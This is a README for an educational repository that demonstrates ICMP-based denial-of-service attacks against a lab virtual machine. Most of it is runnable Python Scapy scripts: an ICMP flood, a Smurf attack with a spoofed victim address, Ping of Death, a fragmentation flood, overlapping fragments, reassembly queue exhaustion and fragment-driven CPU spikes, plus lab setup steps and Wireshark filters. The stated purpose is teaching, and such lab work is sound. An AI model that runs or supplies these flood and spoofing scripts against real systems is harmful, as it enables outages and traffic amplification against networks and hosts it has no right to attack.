# icmp-ddos-demo

# ICMP-based DDoS Attack Demonstration

This repository contains Python scripts to simulate various ICMP-based DDoS attacks, including:

- ICMP Flood
- Smurf Attack
- Ping of Death
- Fragmentation Flood
- Overlapping Fragments
- Reassembly Queue Overflow
- CPU Spike via Fragmentation

These scripts are intended solely for educational purposes in a controlled lab environment.

---

## Prerequisites

Install **Scapy**:
```bash
pip install scapy
```

---

## Lab Setup Instructions (VMware on macOS)

**Recommended:** Use VMware Fusion with Ubuntu Server or Metasploitable2 VM.

### VMware Fusion Setup

1. [Download and install VMware Fusion](https://customerconnect.vmware.com/downloads/#all_products).
2. Create a new VM:
    - Download [Ubuntu Server LTS](https://ubuntu.com/download/server) OR [Metasploitable2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/).
    - Select **Host-Only Networking** for safe isolation.

### Obtain VM IP Address

Run on VM:
```bash
ip addr
```
Use the IP for attack scripts below.

---

## Python Scripts

### 1. ICMP Flood (`icmp_flood.py`)
```python
# ICMP Flood Attack Script
# Sends rapid ICMP echo requests to overwhelm bandwidth and CPU resources.

from scapy.all import IP, ICMP, send

def icmp_flood(target_ip, packet_count=1000):
    packet = IP(dst=target_ip)/ICMP()
    send(packet, count=packet_count, inter=0.001)

# Replace TARGET_IP with your VM's IP address
# icmp_flood("TARGET_IP", 2000)
```

### 2. Smurf Attack (`smurf_attack.py`)
```python
# Smurf Attack Script
# Amplifies traffic by spoofing victim IP to broadcast address.

from scapy.all import IP, ICMP, send

def smurf_attack(broadcast_ip, spoofed_src_ip, packet_count=500):
    packet = IP(src=spoofed_src_ip, dst=broadcast_ip)/ICMP()
    send(packet, count=packet_count, inter=0.01)

# Replace BROADCAST_IP and SPOOFED_IP appropriately
# smurf_attack("BROADCAST_IP", "SPOOFED_IP", 1000)
```

### 3. Ping of Death (`ping_of_death.py`)
```python
# Ping of Death Script
# Sends an oversized ICMP packet to cause crashes or instability.

from scapy.all import IP, ICMP, send, Raw

def ping_of_death(target_ip):
    payload = b'X' * 65500
    packet = IP(dst=target_ip)/ICMP()/Raw(load=payload)
    send(packet)

# Replace TARGET_IP with your VM's IP address
# ping_of_death("TARGET_IP")
```

### 4. Fragmentation Flood (`fragmentation_flood.py`)
```python
# Fragmentation Flood Script
# Rapidly sends fragmented packets causing reassembly exhaustion.

from scapy.all import IP, ICMP, send, fragment, Raw

def fragmentation_flood(target_ip, packet_count=500):
    payload = b'X' * 4000
    packet = IP(dst=target_ip)/ICMP()/Raw(load=payload)
    fragments = fragment(packet, fragsize=8)
    for _ in range(packet_count):
        send(fragments, inter=0.001)

# Replace TARGET_IP with your VM's IP address
# fragmentation_flood("TARGET_IP", 100)
```

### 5. Overlapping Fragments (`overlapping_fragments.py`)
```python
# Overlapping Fragments Script
# Creates conflicting fragments causing confusion in reassembly logic.

from scapy.all import IP, ICMP, send, Raw

def overlapping_fragments(target_ip):
    payload = b'X' * 48
    packet1 = IP(dst=target_ip, id=12345, flags="MF", frag=0)/ICMP()/Raw(load=payload[:24])
    packet2 = IP(dst=target_ip, id=12345, flags=0, frag=2)/Raw(load=payload[16:])
    send([packet1, packet2])

# Replace TARGET_IP with your VM's IP address
# overlapping_fragments("TARGET_IP")
```

### 6. Reassembly Queue Overflow (`reassembly_overflow.py`)
```python
# Reassembly Queue Overflow Script
# Consumes all reassembly resources by generating multiple unique fragmented packets.

from scapy.all import IP, ICMP, send, fragment, Raw
import random

def reassembly_overflow(target_ip, packet_count=500):
    payload = b'X' * 4000
    for _ in range(packet_count):
        id = random.randint(1000, 65000)
        packet = IP(dst=target_ip, id=id)/ICMP()/Raw(load=payload)
        fragments = fragment(packet, fragsize=8)
        send(fragments, inter=0.001)

# Replace TARGET_IP with your VM's IP address
# reassembly_overflow("TARGET_IP", 200)
```

### 7. CPU Spike via Fragmentation (`cpu_spike.py`)
```python
# CPU Spike via Fragmentation Script
# Generates rapid small fragments, causing excessive CPU usage on targeted devices.

from scapy.all import IP, ICMP, send, fragment, Raw

def cpu_spike(target_ip, packet_count=500):
    payload = b'X' * 2000
    packet = IP(dst=target_ip)/ICMP()/Raw(load=payload)
    fragments = fragment(packet, fragsize=8)
    for _ in range(packet_count):
        send(fragments, inter=0.0001)

# Replace TARGET_IP with your VM's IP address
# cpu_spike("TARGET_IP", 100)
```

---

## Wireshark Capture Recommendations

- **ICMP traffic:** `icmp`
- **Fragmentation:** `ip.flags.mf==1 || ip.frag_offset>0`
- **Oversized packets (Ping of Death):** `(icmp) && (frame.len > 1500)`

---

## Disclaimer

This content is for educational use only. Perform these tests responsibly within your own controlled environments.

